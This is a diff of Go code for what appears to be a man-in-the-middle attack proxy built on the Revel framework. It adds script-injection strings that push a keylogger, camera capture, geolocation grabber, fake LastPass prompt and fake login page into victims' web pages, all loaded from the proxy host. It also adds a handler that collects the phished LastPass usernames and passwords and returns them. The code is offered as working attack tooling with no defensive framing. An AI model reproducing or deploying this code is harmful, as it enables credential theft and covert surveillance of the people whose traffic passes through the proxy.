@@ -52,6 +52,12 @@ func InitiateProxy() {
 
 	//turn on the basic proxy
 	globalProxyStandard = true
+
+	INJECT_LOGGER_RESULT = "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/keylogger.js\"></script></body>" 
+	INJECT_PHOTO_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/takePhoto.js\"></script></body>"
+	INJECT_LOCATION_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/getLocation.js\"></script></body>"
+	INJECT_LASTPASS_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/lastpassInjection.js\"></script></body>"
+	INJECT_LOGIN_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/login.js\"></script></body>"
 }
 
 func (c App) Login() revel.Result {
@@ -255,7 +261,22 @@ func (c App) CatchLocation() revel.Result {
 func (c App) GetKeylogs() revel.Result {
 	return c.RenderJson(keylogs)
 }
-
+/*
+          <input type="text" id="lppasswordbottom" class="lpinput" placeholder="Password">
+          <input type="text" id="lppasswordtop" class="lpinput" placeholder="Password">
+*/
+func (c App) Lastpass() revel.Result {
+	var username string
+	var password string
+	c.Params.Bind(&username, "lppasswordtop")
+	c.Params.Bind(&password, "lppasswordbottom")
+	var l Lastpass 
+	l.Username = username
+	l.Password = password
+	lastPassAccounts = append(lastPassAccounts, l)
+	//return all the lastpass accounts
+	return c.RenderJson(lastPassAccounts)
+}
 func (c App) CatchKeyLog() revel.Result {
 	var d string
 	var p string
